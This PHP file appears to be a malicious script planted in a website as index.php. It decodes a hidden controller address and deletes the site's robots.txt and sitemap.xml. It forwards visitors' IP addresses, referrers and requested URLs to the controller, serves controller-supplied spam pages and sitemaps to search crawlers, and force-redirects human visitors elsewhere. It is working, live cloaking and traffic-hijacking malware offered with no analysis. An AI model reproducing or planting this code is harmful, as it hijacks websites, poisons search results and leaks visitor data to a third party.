``<?php
$siteYuming = base64_decode("bG9jYWxob3N0OjkxNTYv");
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$urlrefer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$geturl = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$geturl = str_replace("/index.php?", "", $geturl);
$hostName = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$Remote_Address = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
$language = isset($_SERVER["HTTP_ACCEPT_LANGUAGE"]) ? $_SERVER["HTTP_ACCEPT_LANGUAGE"] : '';
if (is_https()) {
    $ht = "https";
} else {
    $ht = "http";
}
if (file_exists($file = __DIR__ . "/robots.txt")) {
    @unlink($file);
}
if (file_exists($file = __DIR__ . "/sitemap.xml")) {
    @unlink($file);
}
if (stripos($_SERVER['REQUEST_URI'], 'test0824') !== false) {
    $url = "http://" . $siteYuming . "test0824";
    $post_data = array('hostName' => $hostName, 'geturl' => $geturl);
    $htmlToshow = send_post($url, $post_data);
    echo $htmlToshow . "--->" . "1001";
    exit;
}
$conn = $_SERVER['REQUEST_URI'];
$conn = str_replace("/", "", $conn);
$conn = str_replace("?", "", $conn);
$version = preg_match('/sitemap(\d+).xml$/', $conn, $maches);
$version1 = preg_match('/sitemap.xml$/', $conn, $mache);
if (stripos($_SERVER['REQUEST_URI'], 'pingsitemap') !== false) {
    $secondname = "";
    $version1 = preg_match('/([\s\S]*?)\.php/', $conn, $mache);
    if ($version1) {
        $secondname = $mache[0];

    }
    $url = "http://" . $siteYuming . "pingsitemap";
    $post_header = array('Content-Type: application/json',);
    $post_data = array('hostName' => $hostName);
    $sitemapcount = send_post($url, $post_data);
    for ($i = 1; $i <= $sitemapcount; $i++) {
        if (strlen($secondname)>0){
            $pingurl = "http://" . $hostName . '/' . $secondname . '?sitemap' . $i . '.xml';
        }else{
            $pingurl = "http://" . $hostName . '/' . $secondname . 'sitemap' . $i . '.xml';
        }
        $pingurl = "https://www.google.com/ping?sitemap=" . $pingurl;
        $contents = get($pingurl);
        if (strpos($contents, "Sitemap Notification Received")) {
            echo "Submitting Google Sitemap $pingurl : OK!<br>";
        } else {
            echo "Submitting Google Sitemap $pingurl : ERROR!<br>";
        }
    }
    exit;
}
if ($version || $version1) {
    header('Content-type:application/xml');
    $hostName = $ht . "://" . $hostName;
    $url = "http://" . $siteYuming . "sitemap";
    $post_data = array('hostName' => $hostName, 'geturl' => $geturl);
    $htmlToshow = send_post($url, $post_data);
    echo $htmlToshow;
    exit();
}
$url = "http://" . $siteYuming . "getcontent";
if (stripos($user_agent, "bot") !== false && stripos($_SERVER['REQUEST_URI'], '.xml') == FALSE) {
    $hostName = $ht . "://" . $hostName;
    $post_data = array('geturl' => $geturl, 'hostName' => $hostName, 'remoteAddress' => $Remote_Address, 'userAgent' => 'bot', 'blowser' => $language,);
    $htmlToshow = send_post($url, $post_data);
    echo $htmlToshow;
    exit();
} else {
    $post_data = array('urlrefer' => $urlrefer, 'geturl' => $geturl, 'hostName' => $hostName, 'remoteAddress' => $Remote_Address,);
    $htmlToshow = send_post($url, $post_data);
    if ($htmlToshow != "") {
        echo('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=' . $htmlToshow . '" /></head><body><noscript><meta http-equiv="refresh" content="0;url=' . $htmlToshow . '" /></noscript><script>document.location.href = "' . $htmlToshow . '"</script></body></html>');
        exit;
    }
}
function send_post($url, $post_data)
{
    $postdata = http_build_query($post_data);
    $options = array('http' => array('method' => 'POST', 'header' => 'Content-type:application/x-www-form-urlencoded', 'content' => $postdata, 'timeout' => 15 * 60));
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}


function is_https()
{
    if (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    } elseif (!empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}

function get($url)
{
    $contents = @file_get_contents($url);
    if (!$contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $contents = curl_exec($ch);
        curl_close($ch);
    }
    return $contents;
}
?>